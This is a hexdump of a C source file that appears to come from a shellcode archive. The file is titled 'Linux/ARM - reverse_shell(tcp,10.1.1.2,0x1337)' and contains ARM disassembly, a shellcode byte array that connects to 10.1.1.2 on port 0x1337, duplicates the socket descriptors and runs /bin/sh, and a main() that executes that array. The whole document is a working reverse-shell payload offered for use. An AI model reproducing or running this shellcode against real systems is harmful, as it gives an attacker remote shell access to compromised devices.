00000000  2f 2a 0d 0a 54 69 74 6c  65 3a 20 20 20 20 20 4c  |/*..Title:     L|
00000010  69 6e 75 78 2f 41 52 4d  20 2d 20 72 65 76 65 72  |inux/ARM - rever|
00000020  73 65 5f 73 68 65 6c 6c  28 74 63 70 2c 31 30 2e  |se_shell(tcp,10.|
00000030  31 2e 31 2e 32 2c 30 78  31 33 33 37 29 0d 0a 44  |1.1.2,0x1337)..D|
00000040  61 74 65 3a 20 20 20 20  20 20 32 30 31 32 2d 30  |ate:      2012-0|
00000050  39 2d 30 38 0d 0a 54 65  73 74 65 64 20 6f 6e 3a  |9-08..Tested on:|
00000060  20 41 52 4d 31 31 37 36  4a 5a 46 2d 53 20 28 76  | ARM1176JZF-S (v|
00000070  36 6c 29 0d 0a 41 75 74  68 6f 72 3a 20 20 20 20  |6l)..Author:    |
00000080  6d 69 64 6e 69 74 65 73  6e 61 6b 65 0d 0a 0d 0a  |midnitesnake....|
00000090  30 30 30 30 38 30 35 34  20 3c 5f 73 74 61 72 74  |00008054 <_start|
000000a0  3e 3a 0d 0a 20 20 20 20  38 30 35 34 3a 09 65 32  |>:..    8054:.e2|
000000b0  38 66 31 30 30 31 20 09  61 64 64 09 72 31 2c 20  |8f1001 .add.r1, |
000000c0  70 63 2c 20 23 31 0d 0a  20 20 20 20 38 30 35 38  |pc, #1..    8058|
000000d0  3a 09 65 31 32 66 66 66  31 31 20 09 62 78 09 72  |:.e12fff11 .bx.r|
000000e0  31 0d 0a 20 20 20 20 38  30 35 63 3a 09 32 30 30  |1..    805c:.200|
000000f0  32 20 20 20 20 20 20 09  6d 6f 76 73 09 72 30 2c  |2      .movs.r0,|
00000100  20 23 32 0d 0a 20 20 20  20 38 30 35 65 3a 09 32  | #2..    805e:.2|
00000110  31 30 31 20 20 20 20 20  20 09 6d 6f 76 73 09 72  |101      .movs.r|
00000120  31 2c 20 23 31 0d 0a 20  20 20 20 38 30 36 30 3a  |1, #1..    8060:|
00000130  09 31 61 39 32 20 20 20  20 20 20 09 73 75 62 73  |.1a92      .subs|
00000140  09 72 32 2c 20 72 32 2c  20 72 32 0d 0a 20 20 20  |.r2, r2, r2..   |
00000150  20 38 30 36 32 3a 09 30  32 30 66 20 20 20 20 20  | 8062:.020f     |
00000160  20 09 6c 73 6c 73 09 72  37 2c 20 72 31 2c 20 23  | .lsls.r7, r1, #|
00000170  38 0d 0a 20 20 20 20 38  30 36 34 3a 09 33 37 31  |8..    8064:.371|
00000180  39 20 20 20 20 20 20 09  61 64 64 73 09 72 37 2c  |9      .adds.r7,|
00000190  20 23 32 35 0d 0a 20 20  20 20 38 30 36 36 3a 09  | #25..    8066:.|
000001a0  64 66 30 31 20 20 20 20  20 20 09 73 76 63 09 31  |df01      .svc.1|
000001b0  0d 0a 20 20 20 20 38 30  36 38 3a 09 31 63 30 36  |..    8068:.1c06|
000001c0  20 20 20 20 20 20 09 61  64 64 73 09 72 36 2c 20  |      .adds.r6, |
000001d0  72 30 2c 20 23 30 0d 0a  20 20 20 20 38 30 36 61  |r0, #0..    806a|
000001e0  3a 09 61 31 30 38 20 20  20 20 20 20 09 61 64 64  |:.a108      .add|
000001f0  09 72 31 2c 20 70 63 2c  20 23 33 32 09 3b 20 28  |.r1, pc, #32.; (|
00000200  61 64 72 20 72 31 2c 20  38 30 38 63 20 3c 44 75  |adr r1, 808c <Du|
00000210  70 2b 30 78 31 36 3e 29  0d 0a 20 20 20 20 38 30  |p+0x16>)..    80|
00000220  36 63 3a 09 32 32 31 30  20 20 20 20 20 20 09 6d  |6c:.2210      .m|
00000230  6f 76 73 09 72 32 2c 20  23 31 36 0d 0a 20 20 20  |ovs.r2, #16..   |
00000240  20 38 30 36 65 3a 09 33  37 30 32 20 20 20 20 20  | 806e:.3702     |
00000250  20 09 61 64 64 73 09 72  37 2c 20 23 32 0d 0a 20  | .adds.r7, #2.. |
00000260  20 20 20 38 30 37 30 3a  09 64 66 30 31 20 20 20  |   8070:.df01   |
00000270  20 20 20 09 73 76 63 09  31 0d 0a 20 20 20 20 38  |   .svc.1..    8|
00000280  30 37 32 3a 09 32 37 33  66 20 20 20 20 20 20 09  |072:.273f      .|
00000290  6d 6f 76 73 09 72 37 2c  20 23 36 33 09 3b 20 30  |movs.r7, #63.; 0|
000002a0  78 33 66 0d 0a 20 20 20  20 38 30 37 34 3a 09 32  |x3f..    8074:.2|
000002b0  31 30 32 20 20 20 20 20  20 09 6d 6f 76 73 09 72  |102      .movs.r|
000002c0  31 2c 20 23 32 0d 0a 0d  0a 30 30 30 30 38 30 37  |1, #2....0000807|
000002d0  36 20 3c 44 75 70 3e 3a  0d 0a 20 20 20 20 38 30  |6 <Dup>:..    80|
000002e0  37 36 3a 09 31 63 33 30  20 20 20 20 20 20 09 61  |76:.1c30      .a|
000002f0  64 64 73 09 72 30 2c 20  72 36 2c 20 23 30 0d 0a  |dds.r0, r6, #0..|
00000300  20 20 20 20 38 30 37 38  3a 09 64 66 30 31 20 20  |    8078:.df01  |
00000310  20 20 20 20 09 73 76 63  09 31 0d 0a 20 20 20 20  |    .svc.1..    |
00000320  38 30 37 61 3a 09 33 39  30 31 20 20 20 20 20 20  |807a:.3901      |
00000330  09 73 75 62 73 09 72 31  2c 20 23 31 0d 0a 20 20  |.subs.r1, #1..  |
00000340  20 20 38 30 37 63 3a 09  64 35 66 62 20 20 20 20  |  807c:.d5fb    |
00000350  20 20 09 62 70 6c 2e 6e  09 38 30 37 36 20 3c 44  |  .bpl.n.8076 <D|
00000360  75 70 3e 0d 0a 20 20 20  20 38 30 37 65 3a 09 61  |up>..    807e:.a|
00000370  30 30 35 20 20 20 20 20  20 09 61 64 64 09 72 30  |005      .add.r0|
00000380  2c 20 70 63 2c 20 23 32  30 09 3b 20 28 61 64 72  |, pc, #20.; (adr|
00000390  20 72 30 2c 20 38 30 39  34 20 3c 44 75 70 2b 30  | r0, 8094 <Dup+0|
000003a0  78 31 65 3e 29 0d 0a 20  20 20 20 38 30 38 30 3a  |x1e>)..    8080:|
000003b0  09 31 61 39 32 20 20 20  20 20 20 09 73 75 62 73  |.1a92      .subs|
000003c0  09 72 32 2c 20 72 32 2c  20 72 32 0d 0a 20 20 20  |.r2, r2, r2..   |
000003d0  20 38 30 38 32 3a 09 62  34 30 35 20 20 20 20 20  | 8082:.b405     |
000003e0  20 09 70 75 73 68 09 7b  72 30 2c 20 72 32 7d 0d  | .push.{r0, r2}.|
000003f0  0a 20 20 20 20 38 30 38  34 3a 09 34 36 36 39 20  |.    8084:.4669 |
00000400  20 20 20 20 20 09 6d 6f  76 09 72 31 2c 20 73 70  |     .mov.r1, sp|
00000410  0d 0a 20 20 20 20 38 30  38 36 3a 09 32 37 30 62  |..    8086:.270b|
00000420  20 20 20 20 20 20 09 6d  6f 76 73 09 72 37 2c 20  |      .movs.r7, |
00000430  23 31 31 0d 0a 20 20 20  20 38 30 38 38 3a 09 64  |#11..    8088:.d|
00000440  66 30 31 20 20 20 20 20  20 09 73 76 63 09 31 0d  |f01      .svc.1.|
00000450  0a 20 20 20 20 38 30 38  61 3a 09 34 36 63 30 20  |.    808a:.46c0 |
00000460  20 20 20 20 20 09 6e 6f  70 09 09 09 3b 20 28 6d  |     .nop...; (m|
00000470  6f 76 20 72 38 2c 20 72  38 29 0d 0a 20 20 20 20  |ov r8, r8)..    |
00000480  38 30 38 63 3a 09 33 37  31 33 30 30 30 32 20 09  |808c:.37130002 .|
00000490  2e 77 6f 72 64 09 30 78  33 37 31 33 30 30 30 32  |.word.0x37130002|
000004a0  0d 0a 20 20 20 20 38 30  39 30 3a 09 30 33 30 31  |..    8090:.0301|
000004b0  30 31 30 61 20 09 2e 77  6f 72 64 09 30 78 30 33  |010a ..word.0x03|
000004c0  30 31 30 31 30 61 0d 0a  20 20 20 20 38 30 39 34  |01010a..    8094|
000004d0  3a 09 36 65 36 39 36 32  32 66 20 09 2e 77 6f 72  |:.6e69622f ..wor|
000004e0  64 09 30 78 36 65 36 39  36 32 32 66 0d 0a 20 20  |d.0x6e69622f..  |
000004f0  20 20 38 30 39 38 3a 09  30 30 36 38 37 33 32 66  |  8098:.0068732f|
00000500  20 09 2e 77 6f 72 64 09  30 78 30 30 36 38 37 33  | ..word.0x006873|
00000510  32 66 0d 0a 20 20 20 20  38 30 39 63 3a 09 30 30  |2f..    809c:.00|
00000520  20 20 20 20 20 20 20 20  20 20 09 2e 62 79 74 65  |          ..byte|
00000530  09 30 78 30 30 0d 0a 20  20 20 20 38 30 39 64 3a  |.0x00..    809d:|
00000540  09 30 30 20 20 20 20 20  20 20 20 20 20 09 2e 62  |.00          ..b|
00000550  79 74 65 09 30 78 30 30  0d 0a 20 20 20 20 38 30  |yte.0x00..    80|
00000560  39 65 3a 09 34 36 63 30  20 20 20 20 20 20 09 6e  |9e:.46c0      .n|
00000570  6f 70 09 09 09 3b 20 28  6d 6f 76 20 72 38 2c 20  |op...; (mov r8, |
00000580  72 38 29 0d 0a 2a 2f 0d  0a 23 69 6e 63 6c 75 64  |r8)..*/..#includ|
00000590  65 20 3c 73 74 64 69 6f  2e 68 3e 0d 0a 23 69 6e  |e <stdio.h>..#in|
000005a0  63 6c 75 64 65 20 3c 73  74 72 69 6e 67 2e 68 3e  |clude <string.h>|
000005b0  0d 0a 0d 0a 23 64 65 66  69 6e 65 20 53 57 41 50  |....#define SWAP|
000005c0  31 36 28 78 29 09 28 28  78 29 20 3c 3c 20 38 20  |16(x).((x) << 8 |
000005d0  7c 20 28 28 78 29 20 3e  3e 20 38 29 29 0d 0a 0d  || ((x) >> 8))...|
000005e0  0a 63 6f 6e 73 74 20 75  6e 73 69 67 6e 65 64 20  |.const unsigned |
000005f0  63 68 61 72 20 73 63 5b  5d 20 3d 20 7b 0d 0a 0d  |char sc[] = {...|
00000600  0a 09 30 78 30 31 2c 20  30 78 31 30 2c 20 30 78  |..0x01, 0x10, 0x|
00000610  38 46 2c 20 30 78 45 32  2c 0d 0a 09 30 78 31 31  |8F, 0xE2,...0x11|
00000620  2c 20 30 78 46 46 2c 20  30 78 32 46 2c 20 30 78  |, 0xFF, 0x2F, 0x|
00000630  45 31 2c 0d 0a 0d 0a 09  30 78 30 32 2c 20 30 78  |E1,.....0x02, 0x|
00000640  32 30 2c 20 30 78 30 31  2c 20 30 78 32 31 2c 0d  |20, 0x01, 0x21,.|
00000650  0a 09 30 78 39 32 2c 20  30 78 31 61 2c 20 30 78  |..0x92, 0x1a, 0x|
00000660  30 66 2c 20 30 78 30 32  2c 0d 0a 09 30 78 31 39  |0f, 0x02,...0x19|
00000670  2c 20 30 78 33 37 2c 20  30 78 30 31 2c 20 30 78  |, 0x37, 0x01, 0x|
00000680  64 66 2c 0d 0a 09 30 78  30 36 2c 20 30 78 31 63  |df,...0x06, 0x1c|
00000690  2c 20 30 78 30 38 2c 20  30 78 61 31 2c 0d 0a 09  |, 0x08, 0xa1,...|
000006a0  30 78 31 30 2c 20 30 78  32 32 2c 20 30 78 30 32  |0x10, 0x22, 0x02|
000006b0  2c 20 30 78 33 37 2c 0d  0a 09 30 78 30 31 2c 20  |, 0x37,...0x01, |
000006c0  30 78 64 66 2c 20 30 78  33 66 2c 20 30 78 32 37  |0xdf, 0x3f, 0x27|
000006d0  2c 0d 0a 09 30 78 30 32  2c 20 30 78 32 31 2c 0d  |,...0x02, 0x21,.|
000006e0  0a 0d 0a 09 30 78 33 30  2c 20 30 78 31 63 2c 20  |....0x30, 0x1c, |
000006f0  30 78 30 31 2c 20 30 78  64 66 2c 0d 0a 09 30 78  |0x01, 0xdf,...0x|
00000700  30 31 2c 20 30 78 33 39  2c 20 30 78 66 62 2c 20  |01, 0x39, 0xfb, |
00000710  30 78 64 35 2c 0d 0a 09  30 78 30 35 2c 20 30 78  |0xd5,...0x05, 0x|
00000720  61 30 2c 20 30 78 39 32  2c 20 30 78 31 61 2c 0d  |a0, 0x92, 0x1a,.|
00000730  0a 09 30 78 30 35 2c 20  30 78 62 34 2c 20 30 78  |..0x05, 0xb4, 0x|
00000740  36 39 2c 20 30 78 34 36  2c 0d 0a 09 30 78 30 62  |69, 0x46,...0x0b|
00000750  2c 20 30 78 32 37 2c 30  78 30 31 2c 20 30 78 64  |, 0x27,0x01, 0xd|
00000760  66 2c 0d 0a 09 30 78 63  30 2c 20 30 78 34 36 2c  |f,...0xc0, 0x46,|
00000770  0d 0a 0d 0a 09 2f 2a 20  73 74 72 75 63 74 20 73  |...../* struct s|
00000780  6f 63 6b 61 64 64 72 20  2a 2f 0d 0a 09 30 78 30  |ockaddr */...0x0|
00000790  32 2c 20 30 78 30 30 2c  0d 0a 09 2f 2a 20 70 6f  |2, 0x00,.../* po|
000007a0  72 74 3a 20 30 78 31 32  33 34 20 2a 2f 0d 0a 09  |rt: 0x1234 */...|
000007b0  30 78 31 33 2c 20 30 78  33 37 2c 0d 0a 09 2f 2a  |0x13, 0x37,.../*|
000007c0  20 69 70 3a 20 31 30 2e  31 2e 31 2e 32 20 2a 2f  | ip: 10.1.1.2 */|
000007d0  0d 0a 09 30 78 30 41 2c  20 30 78 30 31 2c 20 30  |...0x0A, 0x01, 0|
000007e0  78 30 31 2c 20 30 78 30  32 2c 0d 0a 0d 0a 09 2f  |x01, 0x02,...../|
000007f0  2a 20 22 2f 62 69 6e 2f  73 68 5c 30 22 20 2a 2f  |* "/bin/sh\0" */|
00000800  0d 0a 09 30 78 32 66 2c  20 30 78 36 32 2c 20 30  |...0x2f, 0x62, 0|
00000810  78 36 39 2c 20 30 78 36  65 2c 30 78 32 66 2c 20  |x69, 0x6e,0x2f, |
00000820  30 78 37 33 2c 20 30 78  36 38 2c 20 30 78 30 30  |0x73, 0x68, 0x00|
00000830  0d 0a 7d 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |..};....int main|
00000840  28 29 0d 0a 7b 0d 0a 09  70 72 69 6e 74 66 28 22  |()..{...printf("|
00000850  73 68 65 6c 6c 63 6f 64  65 3d 25 64 20 62 79 74  |shellcode=%d byt|
00000860  65 73 5c 6e 22 0d 0a 09  20 20 20 20 20 20 20 22  |es\n"...       "|
00000870  63 6f 6e 6e 65 63 74 69  6e 67 20 74 6f 20 25 64  |connecting to %d|
00000880  2e 25 64 2e 25 64 2e 25  64 3a 25 68 64 5c 6e 22  |.%d.%d.%d:%hd\n"|
00000890  2c 20 73 69 7a 65 6f 66  20 73 63 2c 0d 0a 09 09  |, sizeof sc,....|
000008a0  73 63 5b 30 78 33 63 5d  2c 20 73 63 5b 30 78 33  |sc[0x3c], sc[0x3|
000008b0  64 5d 2c 20 73 63 5b 30  78 33 65 5d 2c 20 73 63  |d], sc[0x3e], sc|
000008c0  5b 30 78 33 66 5d 2c 0d  0a 09 09 53 57 41 50 31  |[0x3f],....SWAP1|
000008d0  36 28 2a 28 28 75 6e 73  69 67 6e 65 64 20 73 68  |6(*((unsigned sh|
000008e0  6f 72 74 20 2a 29 28 73  63 2b 30 78 33 61 29 29  |ort *)(sc+0x3a))|
000008f0  29 29 3b 0d 0a 09 72 65  74 75 72 6e 20 28 28 69  |));...return ((i|
00000900  6e 74 20 28 2a 29 28 76  6f 69 64 29 29 73 63 29  |nt (*)(void))sc)|
00000910  28 29 3b 0d 0a 7d                                 |();..}|
00000916
